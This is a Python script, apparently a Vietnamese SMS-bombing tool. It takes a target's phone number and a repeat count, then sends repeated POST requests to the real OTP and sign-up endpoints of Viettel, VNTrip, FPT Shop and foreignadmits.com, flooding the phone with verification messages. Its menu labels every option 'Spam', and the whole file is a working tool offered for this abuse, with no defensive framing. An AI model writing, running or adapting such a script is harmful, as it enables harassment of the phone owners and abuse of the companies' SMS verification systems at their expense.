import requests
import json
import time

VT_Login_Url = "https://vietteltelecom.vn/api/get-otp-login"
VT_Sigin_Url = "https://vietteltelecom.vn/api/get-otp"
VN_Trip_Sigin_Url="https://micro-services.vntrip.vn/core-user-service/verification/request/phone"
FPT_Shop_Sigin = "https://fptshop.com.vn/api-data/loyalty/Home/Verification"
STUDENT_Sigin_Url = "https://foreignadmits.com/api/register-otp-generate-student"


#####################
# ------- Colors class ------ #

HEADER = '\033[95m'
BLUE = '\033[94m'
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'
##########################
#-----MAIN_FUNC-----#



print(f'''{FAIL}
TOOL BY 𝑫𝒐𝒂𝒏 𝑽𝒂𝒏 𝑿𝒖𝒂𝒏 𝑸𝒖𝒚𝒆𝒏 𓆏𓆤 3:) ②⓪⓪⑧ !!!\n{HEADER}(https://m.facebook.com/dvx.quyen.208)
\n {ENDC}''')


#---#----#---#---#----#----#


def viettel_login():
    print(f"{CYAN}\n-- Spam Viettel 1 --")
    PHONE = int(input(f"Nhập số điện thoại: {YELLOW}"))
    for i in range(1,1+int(input(f"{CYAN}Số lần gửi: {YELLOW}"))):
        
        dt={"phone":PHONE,"type":""}
        rs=requests.post(VT_Login_Url,data=dt).json()
        
        check = rs["code"]
        def text(Color):
            return (f"{ENDC}"+Color+f"\n+ Lần gửi: ["+str(i)+"]\n"+"+ Phản hồi: "+str(rs["message"])+"\n"+"+ Code: "+str(rs["code"])+f"\n\n{ENDC}")
            
        if(check == 200):
            print(text(f"{GREEN}"))
        else:
            print(text(f"FAIL"))
        
        
#----#----#-----#----#----#----#
        
        
def viettel_sigin():
    print(f"{CYAN}\n-- Spam Viettel 2 --")
    PHONE = int(input(f"Nhập số điện thoại: {YELLOW}"))
    for i in range(1,1+int(input(f"{CYAN}Số lần gửi: {YELLOW}"))):
        
        dt={"msisdn":PHONE,"type":""}
        rs=requests.post(VT_Sigin_Url,data=dt).json()
        
        #check code
        check = rs["code"]
        
        def text(Color):
            return (f"{ENDC}"+Color+f"\n+ Lần gửi: ["+str(i)+"]\n"+"+ Phản hồi: "+str(rs["message"])+"\n"+"+ Code: "+str(rs["code"])+f"\n\n{ENDC}")
            
        if(check == 200):
            print(text(f"{GREEN}"))
        else:
            print(text(f"{FAIL}"))
        
        
#----#---#----#---#---#---#---#---#
        

def vn_trip():
        print(f"{CYAN}\n-- Spam VN_Trip--")
        PHONE = int(input(f"Nhập số điện thoại với mã vùng (ex: 84123456789): {YELLOW}"))
        for i in range(1,1+int(input(f"{CYAN}Số lần gửi: {YELLOW}"))):
            
            dt = {"feature":"register","phone":"+"+str(PHONE)}
            rs = requests.post(VN_Trip_Sigin_Url,data=dt).json()
            
            #check
            check = rs["status"]
            
            def text(Color):
                return (f"{ENDC}"+Color+"\n+ Lần gửi: ["+str(i)+"]\n"+"+ Phản hồi: "+str(rs["message"])+"\n"+"+ Status: "+str(rs["status"])+f"{ENDC}\n\n")
                
            if(check == "success"):
                print(text(f"{GREEN}"))
            else:
                print(text(f"{FAIL}"))
            time.sleep(60)
            

#----#---#----#---#---#---#---#---#


def FPT_Sigin():
        print(f"{CYAN}\n-- Spam FPT --")
        PHONE = int(input(f"Nhập số điện thoại: {YELLOW}"))
        for i in range(1,1+int(input(f"{CYAN}Số lần gửi: {YELLOW}"))):
            
            dt = {"phone":PHONE}
            rs = requests.post(FPT_Shop_Sigin,data=dt).json()
            
            #check
            check = str(rs["datas"]["result"])
            
            def text(Color):
                return (f"{ENDC}"+Color+"\n+ Lần gửi: ["+str(i)+"]\n"+"+ Phản hồi: "+str(rs["datas"]["result"])+f"\n{ENDC}")
            if(check == "True"):
                print(text(f"{GREEN}"))
            else:
                print(text(f"{FAIL}"))
            time.sleep(0.7)
        
        
#----#---#----#---#---#---#---#---#
        

def STUDENT_Sigin():
        print(f"{CYAN}\n-- Spam Student --")
        PHONE = int(input(f"Nhập số điện thoại: {YELLOW}"))
        for i in range(1,1+int(input(f"{CYAN}Số lần gửi: {YELLOW}"))):
            
            dt = {"mobile":PHONE,"countryCode":"+84"}
            rs = requests.post(STUDENT_Sigin_Url,data=dt).json()
            
            #check
            check = str(rs["status"])
            
            def text(Color):
                return (f"{ENDC}"+Color+"\n+ Lần gửi: ["+str(i)+"]\n"+"+ Phản hồi: "+check+f"\n{ENDC}")
            if(check != "error"):
                print(text(f"{GREEN}"))
            else:
                print(text(f"{FAIL}"))

            
            
#---#---#---#---#----#----#---#-----#




first_choose = input(f"{GREEN}[ 1 ] Spam Viettel 1\n[ 2 ] Spam Viettel 2 (giới hạn 5 lần)\n[ 3 ] Span_VN_Trip\n[ 4 ] Spam FPT\n[ 5 ] Spam Student\n\nChọn chức năng: {YELLOW}")

if(first_choose == "1"):
    viettel_login()
elif(first_choose == "2"):
    viettel_sigin()
elif(first_choose == "3"):
    vn_trip()
elif(first_choose == "4"):
    FPT_Sigin()
elif(first_choose == "5"):
    STUDENT_Sigin()
else:
    exit("exit program! ")
